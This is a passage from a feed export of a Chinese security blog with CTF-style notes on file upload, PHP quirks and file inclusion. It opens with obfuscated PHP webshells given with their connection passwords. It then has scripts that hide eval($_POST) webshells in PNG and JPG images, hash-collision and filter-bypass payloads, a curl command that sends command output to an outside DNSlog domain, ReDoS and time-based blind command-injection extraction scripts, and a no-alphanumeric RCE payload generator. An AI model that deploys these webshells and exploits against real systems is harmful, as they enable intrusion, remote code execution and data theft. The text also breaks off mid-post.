$qdjZ=create_function(chr(0x1cf-0x1ab).str_rot13(&#39;f&#39;).chr(0x15009/0x307).chr(228-119).str_rot13(&#39;r&#39;),base64_decode(&#39;ZQ==&#39;).chr(104076/882).str_rot13(&#39;n&#39;).chr(651-543).chr(01545-01475).base64_decode(&#39;JA==&#39;).chr(90045/783).chr(0xca0e/0x1d2).str_rot13(&#39;z&#39;).chr(810-709).str_rot13(&#39;)&#39;).chr(29028/492));$qdjZ(base64_decode(&#39;Njc5M&#39;.&#39;jMzO0&#39;.&#39;BldkF&#39;.&#39;sKCRf&#39;.&#39;&#39;.base64_decode(&#39;VQ==&#39;).base64_decode(&#39;RQ==&#39;).str_rot13(&#39;9&#39;).chr(0xbe50/0x244).chr(390-304).&#39;&#39;.&#39;&#39;.str_rot13(&#39;S&#39;).chr(0157503/0761).str_rot13(&#39;k&#39;).base64_decode(&#39;TQ==&#39;).chr(01077-0725).&#39;&#39;.&#39;NdKTs&#39;.&#39;yMDM3&#39;.&#39;Njk5O&#39;.&#39;w==&#39;.&#39;&#39;));?&gt;      // 连接密码: TyKPuntU&lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#39;bw==&#39;).base64_decode(&#39;bQ==&#39;).base64_decode(&#39;ZQ==&#39;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#39;YQ==&#39;).base64_decode(&#39;bA==&#39;).chr(060340/01154).chr(01041-0775).base64_decode(&#39;cw==&#39;).str_rot13(&#39;b&#39;).chr(01504-01327).base64_decode(&#39;ZQ==&#39;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#39;NjgxO&#39;.&#39;Tc7QG&#39;.&#39;V2QWw&#39;.&#39;oJF9Q&#39;.&#39;&#39;.str_rot13(&#39;G&#39;).str_rot13(&#39;1&#39;).str_rot13(&#39;A&#39;).base64_decode(&#39;VQ==&#39;).str_rot13(&#39;J&#39;).&#39;&#39;.&#39;&#39;.chr(0x304-0x2d3).base64_decode(&#39;Ug==&#39;).chr(13197/249).str_rot13(&#39;F&#39;).base64_decode(&#39;MQ==&#39;).&#39;&#39;.&#39;B1bnR&#39;.&#39;VXSk7&#39;.&#39;MjA0N&#39;.&#39;TkxOw&#39;.&#39;==&#39;.&#39;&#39;));?&gt;</code></pre><p>PNG二次渲染脚本</p><pre><code>&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#39;1.png&#39;);  //要修改的图片的路径/*木马内容   &lt;?$_GET[0]($_POST[1]);?&gt;   */?&gt;建议使用已经渲染过一次的文件写入木马，防止文件改动过大。</code></pre><p>JPG二次渲染脚本</p><pre><code>&lt;?php    $miniPayload = &quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;;    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;        die(&#39;php-gd is not installed&#39;);    &#125;    if(!isset($argv[1])) &#123;        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) &#123;            die(&#39;Incorrect SOI marker&#39;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() === 0xFF) &#123;                            if($dis-&gt;readByte !== 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;                    die(&#39;Success!&#39;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#39;payload_&#39;.$argv[1]);    die(&#39;Something\&#39;s wrong&#39;);    function checkImage($filename, $data, $unlink = FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes = (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) &#123;            $this-&gt;binData = &#39;&#39;;            $this-&gt;order = $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);                $this-&gt;binData = file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData = $filename;            &#125;            $this-&gt;size = strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData = substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#39;End Of File&#39;);            &#125;            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#39;End Of File&#39;);            &#125;            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        &#125;    &#125;?&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;文件上传漏洞可以分为以下几类：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;类型限制绕过：Web应用程序对上传文件的类型进行限制，黑名单或白名单方式
  </summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>PHP特性</title>
    <link href="https://liu1272.github.io/2023/04/12/PHP%E7%89%B9%E6%80%A7/"/>
    <id>https://liu1272.github.io/2023/04/12/PHP%E7%89%B9%E6%80%A7/</id>
    <published>2023-04-12T02:12:00.000Z</published>
    <updated>2023-04-17T17:03:30.235Z</updated>
    
    <content type="html"><![CDATA[<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>积累各种函数，PHP语法特性，从中发现漏洞<br>要求深入了解PHP语言并熟练使用其函数。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【PHP比较运算符一览表】$a == $b      等于       true，如果类型转换后 $a 等于 $b。$a === $b     全等       true，如果 $a 等于 $b，并且它们的类型也相同。$a != $b      不等       true，如果类型转换后 $a 不等于 $b。$a &lt;&gt; $b      不等       true，如果类型转换后 $a 不等于 $b。$a !== $b     不全等     true，如果 $a 不等于 $b，或者它们的类型不同。$a &lt; $b       小与       true，如果 $a 严格小于 $b。$a &gt; $b       大于       true，如果 $a 严格大于 $b。$a &lt;= $b      小于等于   true，如果 $a 小于或者等于 $b。$a &gt;= $b      大于等于   true，如果 $a 大于或者等于 $b。$a &lt;=&gt; $b     太空船运算符（组合比较符）   当$a小于、等于、大于 $b时 分别返回一个小于、等于、大于0的 int 值。当两个操作对象都是数字字符串，或一个是数字另一个是数字字符串，就会自动按照数值进行比较。当比较时用的是 === 或 !==， 则不会进行类型转换(因为不仅要对比数值，还要对比类型)【preg_match 函数】preg_match()返回 pattern的匹配次数。 因为preg_match()在第一次匹配后将会停止搜索，所以它的值将是0次（不匹配）或1次因为preg_match函数无法处理数组，所以可以通过数组的方式绕过^表示匹配行头，$表示匹配行尾，i表示大小写都匹配，m表示多行匹配当^$一起的时候表示精准匹配，需要行首行尾都要有【intval 函数】通过使用指定的进制 base 转换（默认是十进制），返回变量的整数数值base是0时检测变量格式，有0x前缀使用十六进制，0开头使用八进制，否则使用十进制且只看字母之前的部分intval()不能用于object否则会产生E_NOTICE错误并返回1（也就是True）由于数组为一个对象，所以对这时它会返回1此外，如果字符串以空格开头，intval函数会将其删除，然后再进行转换【弱类型绕过】===是先比较他们的类型然后在比较，==是先把他们转化成相同类型然后在进行比较例如，将一个字符串转换为整数时，PHP会尝试将字符串中的数字部分转换为整数如果字符串中不包含数字，则转换结果为0【strpos 函数】strpos($num, &quot;0&quot;)返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE（区分大小写）【stripos 函数】查找字符串在另一字符串中第一次出现的位置（不区分大小写）注意！字符串位置从0开始，不是从1开始【md5】对象的md5值是由对象的属性和方法组成的字符串的md5散列值。如果两个对象的属性和方法完全相同，则它们的md5值也会相同。因此a[]=1&amp;b[]=2的md5值就是相同的还有0e开头的字符串，会被PHP解释为0弱比较时常用的有QNKCDZO   s878926199a240610708  aabg7XSs  aabC9RqS  s878926199a强比较的需要使用数组绕过当使用string强行转换成字符串时限制了数组绕过这方法强碰撞使用M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2和M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2【in_array 函数】在大海（文件）中捞针（$allow）$allow = array(1,&#39;2&#39;,&#39;3&#39;);var_dump(in_array(&#39;文件&#39;,$allow));返回的为true$allow = array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;);var_dump(in_array(&#39;文件&#39;,$allow));返回false其实还有第三个参数type，用于判断数据类型是否相同php字符串和int比较时字符串会被转换成int因为是弱类型转换，所以数字后面的字符串会被忽略【file_put_contents 函数】file_put_contents(file,data,mode,context)file：规定写入的文件data：写入文件的数据mode：如何打开/写入文件(FILE_USE_INCLUDE_PATH,FILE_APPEND,LOCK_EX)context:文件句柄的环境【array_push 函数】给数组的结尾添加其他数值【PHP反射类】PHP反射类ReflectionClass()是PHP5及以上的一个内置类，它允许开发者在运行时获取一个类的信息:1.获取类的名称、父类、接口和命名空间2.获取类的属性，并获取或修改属性的访问权限、默认值和注释3.获取类的方法，并获取或修改方法的访问权限、参数、返回值和注释4.判断类是否为抽象类、接口或终极类5.获取类的文档注释和注解信息6.动态创建类的实例，并调用类的方法和属性使用echo new ReflectionClass命令即可输出因为ReflectionClass变量已经定义了，所以PHP解释器不会输出警告信息，而是将该变量的值设置为null。最终的效果是输出ReflectionClass类的定义信息，而没有输出警告信息。【call_user_func 函数】call_user_func($func, 1, 2);使用1,2的参数调用func的方法并返回结果【0x识别】7.1以下版本，0x的字符串也是可以识别为十六进制的在高版本下进制转换可以使用hex2bin函数将十六进制转换为ASCII字符例如:&lt;?=`cat *`;经过base64编码变成PD89YGNhdCAqYDs=使用bin2hex函数转换成5044383959474e6864434171594473带e的话会被认为是科学计数法，可以绕过is_numeric检测写入时使用伪协议php://filter/write=convert.base64-decode/resource=1.php注意:等号在base64中只是起到填充的作用，有没有等号解码出来的内容是相同的。【SHA1】sha1弱等于的，找加密后0e开头的即可aaK1STfY ==&gt;0e76658526655756207688271159624026011393aaO8zKZF ==&gt;0e89257456677279068558073954252716165668甚至可以使用数组绕过！【$$覆盖赋值】$var = &#39;hello&#39;;$$var = &#39;world&#39;;echo $hello;      // 输出 world可以看成这样子$var = &#39;hello&#39;;$($var) = &#39;world&#39;;echo $hello;      // 输出 world【ereg】只存在与PHP 5.3.4及之前的版本中一个比较古老的正则表达式匹配函数，一大把的漏洞用指定的模式搜索一个字符串中指定的字符串,成功为true,否则为false（大小写敏感）ereg函数存在NULL（%00）截断漏洞，可以绕过正则过滤，使用%00截断。函数匹配的字符串中包含NULL字符时会在NULL处停止匹配【strrev 函数】翻转字符串，没啥好讲的。【PHP异常处理类】Exception处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类关于内置类的应用前面已经讲过了echo new ReflectionClass(system(&#39;ls&#39;));这种题看似很难，其实只需要在PHP手册里找到合适的类即可【GLOBALS】$GLOBALS — 引用全局作用域中可用的全部变量一个包含了全部变量的全局组合数组，变量的名字就是数组的键。【is_file 函数】检查指定的文件名是否是正常的文件?file=php://filter/resource=1.phpphp://filter/resource=1.phpphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.phpphp://filter/read=convert.quoted-printable-encode/resource=1.phpcompress.zlib://1.php使用伪协议就能绕过检测原因是，伪协议实际上是一种特殊的URI（统一资源标识符），可以用来访问本地或远程的资源。当使用伪协议访问文件时，PHP会将其视为一个URI而不是一个文件路径，因此is_file函数无法判断其是否是一个文件。【filter 函数】对来自非安全来源的数据（比如用户输入）进行验证和过滤实际上感觉没啥用？？？【目录溢出】参数长度超过了配置文件中的&quot;max_input_vars&quot;和&quot;post_max_size&quot;参数时发生溢出发生溢出后可以操作文件读取，文件删除，文件上传，代码执行，拒绝服务例如:?file=/proc/self/root/....../proc/self/root/var/www/html/a.php【trim 函数】trim(string,charlist)string       必需。规定要检查的字符串。charlist     可选。规定从字符串中删除哪些字符。省略该参数则移除下列所有字符：&quot;\0&quot;       - NULL&quot;\t&quot;       - 制表符&quot;\n&quot;       - 换行&quot;\x0B&quot;     - 垂直制表符&quot;\r&quot;       - 回车&quot; &quot;        - 空格绕过时可以用 数字 + - . %09 %0a %0b %0c %0d %20【PHP变量名】PHP变量名由数字字母下划线组成GET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_而且还有一个特性就是被转化一次之后，就不会再次转换【extract 函数】extract($a)数组a中的键名作为变量名，键值作为变量值，导入到当前的符号表中。如果数组a中存在与当前符号表中已有的变量名相同的键名，则会覆盖已有的变量值。【gettext 函数】在开启该拓展后_()等效于gettext()等效于echo【get_defined_vars 函数】返回一个包含所有已定义变量列表的多维数组，包括环境变量、服务器变量和用户定义的变量【readfile 函数利用】函数作用:读取文件并写入到输出缓冲利用方法:将读取的参数设置为想要读取的文件路径(适当增加../)【正则最大回溯次数绕过/正则溢出攻击】PHP为了防止正则表达式的拒绝服务攻击（reDOS）给 pcre 设定了一个回溯次数上限(pcre.backtrack_limit)回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false注:攻击脚本EXP在文末【小小的语法糖】在PHP中，&#39;或者shell_exec()都是执行shell命令的方法。&#39;是一种语法糖，可以将命令作为字符串嵌入到PHP代码中，相当于执行了shell_exec()方法。但是&#39;只能执行简单的shell命令而且不能获取命令的输出结果。// 使用``语法糖执行shell命令$time = `date`;echo $time;// 使用shell_exec()方法执行shell命令$time = shell_exec(&#39;date&#39;);echo $time;【使用curl获取信息】首先需要一个域名(可以去这里搞一个http://dnslog.cn/或者https://requestbin.net/)再执行命令 ————&gt; curl`ls`.域名【parse_str 函数】把查询字符解析到变量$query_string = &#39;foo[]=123&amp;foo[]=456&#39;;parse_str($query_string, $vars);echo $vars[&#39;foo&#39;][0];  // 输出：123echo $vars[&#39;foo&#39;][1];  // 输出：456【ectract 函数】从数组中将变量导入当前的符号表$person = array(&#39;name&#39; =&gt; &#39;Alice&#39;, &#39;age&#39; =&gt; 25, &#39;gender&#39; =&gt; &#39;female&#39;);extract($person);echo $name;    // 输出：Aliceecho $age;     // 输出：25echo $gender;  // 输出：female【tee 命令】tee用于显示程序的输出并将其复制到一个文件中ls / |tee 1     意思是列出根目录并保存到1文件下【修改源文件的骚方法】sed是一种流编辑器处理下一行，这样不断重复，直到文件末尾但是文件内容并没有改变，除非你使用重定向存储输出xargs是给命令传递参数的一个过滤器可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。当使用系统命令时system(&#39;ls | xargs sed -i &quot;s/exec/system/&quot;&#39;);exec(&#39;ls | xargs sed -i &quot;s/exec/system/&quot;&#39;);【调用类内函数方法】无参调用类的静态方法:classname=classname::member_function无参调用类的数组传递调用:传入的参[0]=classname&amp;传入的参[1]=member_function【Linux命令盲注】if [ `ls / -1|awk &#39;NR==1&#39;|cut -c &#123;&#125; ` = b ];then sleep 2;fi    ls / -1 :列出根目录下的所有文件和目录，每个文件和目录占一行    #awk &#39;NR==&#123;0&#125;&#39; :逐行输出获取    #cut -c &#123;1&#125; :截取单个字符    `` :执行命令并返回结果    sleep 2 :延迟两秒回显    fi :Shell脚本中表示if语句结束Shell命令盲注脚本在文末。【PHP命令数字混合计算】php里数字可以和命令可以进行运算eval(1-phpinfo()-1)的结果为执行phpinfophpinfo()执行成功返回true，1-1-1=-1此时仍然可以使用无字母数字RCE脚本，具体查看文末【create_function 函数】create_function(&#39;$a,$b&#39;,&#39;return 111;&#125;phpinfo();//&#39;)    相当于function a($a, $b)&#123;    return 111;&#125;phpinfo();//&#125;所以  ?show=&#125;?&gt;&lt;?=`ls`;//  就可以执行ls命令【命名空间污染】在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径（使用的是根命名空间）如果你在其他namespace里调用系统类，就必须写绝对路径这种写法因为将函数名改为了以反斜杠（\）开头的命名空间，所以正则表达式无法匹配到这个函数名安全的正则表达式应该是   &#39;/^\\myapp\\[a-z0-9_]*$/isD&#39;【包含session文件】SESSION 文件保存的目录由 session.save_path 指定，文件名以 sess_ 为前缀，后跟 SESSION ID默认路径一般为:/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID文件中的数据是序列化之后的 SESSION 数据getshell方法:添加一个Cookie：PHPSESSID=flag并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马详细操作请查看上一篇文章。</code></pre><p>各种payload</p><pre><code>小数点(含有0)      ?num=4476.0科学计数           ?num=4476e0十六进制           ?num=0x117c八进制             ?num=010574八进制+空格        ?num= 010574正负号             ?num=+4476.0</code></pre><p>下面记一道$$覆盖赋值的题:</p><pre><code>&lt;?phphighlight_file(__FILE__);include(&#39;flag.php&#39;);error_reporting(0);$error=&#39;你还想要flag嘛？&#39;;$suces=&#39;既然你想要那给你吧！&#39;;foreach($_GET as $key =&gt; $value)&#123;        //自己传入的x是key,flag是value    if($key===&#39;error&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;                       //$(x)=$(flag)，现在相当于x变量就是flag&#125;foreach($_POST as $key =&gt; $value)&#123;       //自己传入的error是key,x是value    if($value===&#39;flag&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;                       //$(error)=$(x)=$(flag)，相当于把error变量重构&#125;if(!($_POST[&#39;flag&#39;]==$flag))&#123;    die($error);                         //error输出时其实已经是flag了&#125;echo &quot;your are good&quot;.$flag.&quot;\n&quot;;die($suces);?&gt;解法:(GET)?x=flag   (POST)error=x</code></pre><p>再来一题</p><pre><code>&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 = $_GET[&#39;v1&#39;];    $v2 = $_GET[&#39;v2&#39;];    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;        if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#39;/ctfshow/&#39;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;?&gt;解法:?v1=ctfshow&amp;v2=GLOBALS</code></pre><p>reDOS攻击EXP</p><pre><code>#原理就是提交含有重复的会被正则匹配的巨大的字符串，使它匹配到不能再匹配为止import requestsurl=&quot;??????????&quot;data=&#123;    &#39;?&#39;:&#39;???&#39;*250000+&#39;?????&#39;&#125;r=requests.post(url,data=data)print(r.text)</code></pre><p>bash盲注EXP</p><pre><code>//一些语句自己改正#!/usr/bin/env python3#-*- coding:utf-8 -*-import requestsimport time as tfrom urllib.parse import quote as urlenurl  = &#39;??????/??=&#39;????&#39;;&#39;alphabet = [&#39;&#123;&#39;,&#39;&#125;&#39;, &#39;.&#39;, &#39;@&#39;, &#39;-&#39;,&#39;_&#39;,&#39;=&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;j&#39;,&#39;h&#39;,&#39;i&#39;,&#39;g&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]result = &#39;&#39;for i in range(1,50):    for char in alphabet:        # payload = &quot;if [ `ls  | grep &#39;flag&#39; |cut -c&#123;&#125;` = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char) #flag.php        payload = &quot;if [ `cat flag.php | grep &#39;flag&#39; |cut -c&#123;&#125;` = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char)        # data = &#123;&#39;cmd&#39;:payload&#125;        try:            start = int(t.time())            r = requests.get(url+payload)            # r = requests.post(url, data=data)            end = int(t.time()) - start            if end &gt;= 3:                        result += char                print(&quot;Flag: &quot;+result)                break        except Exception as e:            print(e)</code></pre><p>Shell命令盲注脚本</p><pre><code>//列出目录import requestsimport timeimport stringstr=string.ascii_letters+string.digits+&#39;_~&#39;result=&quot;&quot;for i in range(1,10):#行    key=0    for j in range(1,15):#列        if key==1:            break        for n in str:            payload=&quot;if [ `ls /|awk &#39;NR==&#123;0&#125;&#39;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)            #print(payload)            url=&quot;?????/?c=&quot;+payload            try:                requests.get(url,timeout=(2.5,2.5))    //延时之类的自己改，看网络情况            except:                result=result+n                print(result)                break            if n==&#39;~&#39;:                key=1                result+=&quot; &quot;                                //获取值import requestsimport timeimport stringstr=string.digits+string.ascii_lowercase+&quot;-&quot;result=&quot;&quot;key=0for j in range(1,45):    print(j)    if key==1:        break    for n in str:        payload=&quot;if [ `cat /1.php|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)        #print(payload)        url=&quot;?????/?c=&quot;+payload        try:            requests.get(url,timeout=(2.5,2.5))        except:            result=result+n            print(result)            break</code></pre><p>无字母数字RCE脚本</p><pre><code>import recontent = &#39;&#39;preg = &#39;[a-z]|[0-9]&#39; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i | j            if 32 &lt;= k &lt;= 126:                a = &#39;%&#39; + hex(i)[2:].zfill(2)                b = &#39;%&#39; + hex(j)[2:].zfill(2)                content += (chr(k) + &#39; &#39; + a + &#39; &#39; + b + &#39;\n&#39;)f = open(&#39;rce_or.txt&#39;, &#39;w&#39;)f.write(content)while True:    payload1 = &#39;&#39;    payload2 = &#39;&#39;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#39;rce_or.txt&#39;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#39;(&quot;&#39;+payload1+&#39;&quot;|&quot;&#39;+payload2+&#39;&quot;)&#39;    print(&quot;payload: &quot;+ payload)</code></pre><p>各种可用的PHP类</p><pre><code>FilesystemIterator遍历文件 getcwd()函数返回当前路径directoryIterator遍历目录</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h4&gt;&lt;p&gt;积累各种函数，PHP语法特性，从中发现漏洞&lt;br&gt;要求深入了解PHP语言并熟练使用其函数。&lt;/p&gt;
&lt;h4 id=&quot;漏洞利用&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="https://liu1272.github.io/2023/04/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://liu1272.github.io/2023/04/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2023-04-11T14:36:00.000Z</published>
    <updated>2023-04-17T17:03:44.172Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证<br>导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 </p><p>这种漏洞通常出现在应用程序中动态引用文件的代码中<br>或是出现在用户可以控制文件名、文件路径或文件内容的输入参数上。<br>攻击者可以在这些参数中注入特定的字符，从而构造一个恶意文件路径并被应用程序读取<br>应用程序没有对这个路径进行验证，最终导致攻击者可以获取系统权限或读取任意文件。 </p><p>在开发应用程序时，需要对文件路径进行验证<br>并遵循最小权限原则，确保应用程序具有最小的访问权限。<br>此外，使用白名单或安全沙箱技术也可以帮助防止文件包含漏洞的发生</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【使用伪协议读取文件】参数=php://filter/convert.base64-encode/resource=目标文件file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==    file=data://text/plain,&lt;?=`tac 